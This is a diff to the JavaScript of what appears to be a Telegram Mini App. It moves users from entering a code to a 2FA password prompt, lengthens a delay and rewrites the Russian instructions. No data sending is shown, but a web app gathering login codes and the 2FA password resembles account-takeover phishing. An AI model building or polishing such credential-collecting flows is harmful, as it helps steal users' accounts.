@@ -80,16 +80,17 @@ document.addEventListener('DOMContentLoaded', () => {
             showLoading();
             statusMsg.textContent = 'Проверяем код...';
             tg.HapticFeedback.impactOccurred('medium');
-            // Переход к 2FA
+            
+            // Переход к 2FA после задержки, с инструкцией
             setTimeout(() => {
                 console.log('Transition to 2FA input');
                 hideLoading();
                 codeInput.classList.add('hidden');
                 twoFaInput.classList.remove('hidden');
-                submitBtn.textContent = 'Подтвердить 2FA';
-                statusMsg.textContent = 'Если 2FA настроен, введите пароль (иначе оставьте пустым).';
+                submitBtn.textContent = 'Подтвердить 2FA (если требуется)';
+                statusMsg.innerHTML = 'Проверьте сообщение в чате с ботом.<br>Если 2FA требуется, введите пароль ниже и подтвердите.<br>Иначе просто закройте приложение.';
                 currentStep = '2fa';
-            }, 1500);
+            }, 3000);  // 3 секунды, чтобы пользователь успел увидеть сообщение бота
             return;
         }
 
